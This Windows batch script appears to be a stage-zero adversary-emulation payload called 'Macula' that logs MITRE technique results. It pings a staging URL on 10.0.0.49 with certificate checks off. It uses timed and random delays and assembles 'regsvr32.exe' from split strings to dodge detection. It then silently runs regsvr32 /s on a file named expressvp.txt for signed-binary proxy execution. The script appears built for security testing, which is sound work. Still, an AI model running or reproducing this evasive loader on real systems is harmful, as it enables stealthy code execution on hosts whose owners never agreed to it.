@echo off
SETLOCAL EnableDelayedExpansion
SET yktnwwf=%APPDATA%\8861\adde2e54
SET fpakbq=Macula-Stage0-8861
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8861-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=expressvp.txt
SET fpldhe=8861
SET logfile=%APPDATA%\!yydue!\macula-simulations.log
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_started>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET TTP_ID=T1105
SET TTP_NAME=Ingress Tool Transfer
SET RESULT=1
SET ERR_DETAIL=
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-!TTP_ID!|!TTP_NAME!=!RESULT!:!ERR_DETAIL!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_done>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start>> "!logfile!" 2>nul
cd /d "!yktnwwf!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_done>> "!logfile!" 2>nul
SET /A delay=!RANDOM! %% 20 + 10
CHOICE /C Y /N /D Y /T !delay! >nul
SET xjpqzw=%WINDIR%\System32
SET vbnckm=Reg
SET mnbvcx=svr32.exe
SET cmd=!vbnckm!!mnbvcx!
SET arg1=/
SET arg2=s
SET args=!arg1!!arg2!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: regsvr32_start>> "!logfile!" 2>nul
CALL :exec_regsvr
IF !errorlevel! EQU 0 (SET RESULT=1) ELSE (SET RESULT=0 & SET ERR_DETAIL=load_failed)
SET TTP_ID=T1218
SET TTP_NAME=Signed Binary Proxy Execution
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-!TTP_ID!|!TTP_NAME!=!RESULT!:!ERR_DETAIL!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: regsvr32_done>> "!logfile!" 2>nul
ENDLOCAL
exit /b 0
:exec_regsvr
SET finalcmd=!xjpqzw!\!cmd! !args! !edjwtl!
CALL !finalcmd!
exit /b